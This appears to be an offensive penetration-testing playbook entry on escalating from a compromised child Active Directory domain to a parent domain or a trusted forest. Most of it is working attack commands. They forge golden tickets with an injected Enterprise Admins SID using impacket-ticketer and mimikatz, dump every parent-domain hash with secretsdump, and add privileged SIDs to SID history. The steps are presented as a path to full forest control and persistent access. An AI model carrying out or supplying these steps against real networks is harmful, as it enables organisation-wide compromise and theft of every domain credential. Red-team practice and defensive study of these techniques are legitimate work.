---
id: domain-trust-abuse
title: Domain / Forest Trust Abuse
stage: objective
tags: [windows, ad]
summary: Abuse Active Directory trust relationships to move from a compromised child domain or forest to parent domains or trusted forests — requires DA in the source domain and the krbtgt hash.
leads_to:
  - domain-admin
  - dcsync
  - golden-ticket
---

## Prerequisites

Domain Admin (or equivalent) in the source domain. The krbtgt hash of the source domain (from DCSync). A trust relationship visible via BloodHound or `nltest`. For child-to-parent escalation: the SID of Enterprise Admins in the parent domain. For cross-forest: a valid trust key.

Trust abuse exploits the way Kerberos handles inter-domain authentication. In a parent-child trust, the child domain's krbtgt can forge a TGT with an extra SID (Enterprise Admins SID from the parent) injected into the PAC — the parent's KDC honours it because the trust is transitive. This escalates from Child DA to full control of the parent domain.

## Quick Win

> Enumerate trusts first — confirm what's there before attempting exploitation.

```bash
# From Linux
impacket-GetADUsers $DOMAIN/DA_USER:PASS -dc-ip $DC_IP -all
nltest /domain_trusts  # from Windows shell

# BloodHound Cypher
MATCH (n)-[:TrustedBy]->(m) RETURN n.name, m.name
```

## Enumerate Trusts

```bash
# impacket
impacket-lookupsid $DOMAIN/user:pass@$DC_IP

# PowerView (from Windows shell)
Get-DomainTrust
Get-ForestTrust
Get-DomainTrust -Domain $PARENT_DOMAIN

# Get Enterprise Admins SID
Get-DomainGroup "Enterprise Admins" -Domain $PARENT_DOMAIN | select objectsid
```

## Child → Parent Domain (Extra SID Attack)

```bash
# Requirements:
# - krbtgt hash of child domain (from DCSync)
# - SID of child domain
# - SID of Enterprise Admins in parent domain

# Get child domain SID
impacket-getPac -targetUser administrator $CHILD_DOMAIN/administrator:PASS

# Forge inter-realm TGT with extra SID
impacket-ticketer \
  -nthash $CHILD_KRBTGT_HASH \
  -domain $CHILD_DOMAIN \
  -domain-sid $CHILD_DOMAIN_SID \
  -extra-sid $ENTERPRISE_ADMINS_SID \
  administrator

export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass $PARENT_DOMAIN/administrator@$PARENT_DC -just-dc
```

## Child → Parent (Mimikatz)

```powershell
# Get child domain SID
Get-DomainSID

# Forge golden ticket with EA SID
mimikatz # kerberos::golden /user:Administrator /domain:child.domain.local
  /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519
  /krbtgt:KRBTGT_HASH /ptt

# Access parent DC
ls \\PARENT_DC\C$
```

## Cross-Forest Trust Abuse (One-Way)

```bash
# If a one-way trust exists — target trusts source
# Enumerate foreign group memberships
Get-DomainForeignGroupMember -Domain $TARGET_DOMAIN

# If you have credentials valid in the trusted domain
impacket-GetUserSPNs $TARGET_DOMAIN/user:pass -dc-ip $TARGET_DC -request
```

## SID History Attack

```powershell
# If SID filtering is disabled on the trust
# Add high-priv SID to a user's SID history
mimikatz # privilege::debug
mimikatz # sid::patch
mimikatz # sid::add /sam:lowprivuser /new:S-1-5-21-PARENT-SID-519
```

## Leads To

Enterprise Admins TGT forged → full control of parent forest → DCSync all parent domain hashes → domain-admin in parent. Cross-forest credential valid → repeat full attack path in new forest. Golden ticket with extra SIDs → persistent cross-domain access.
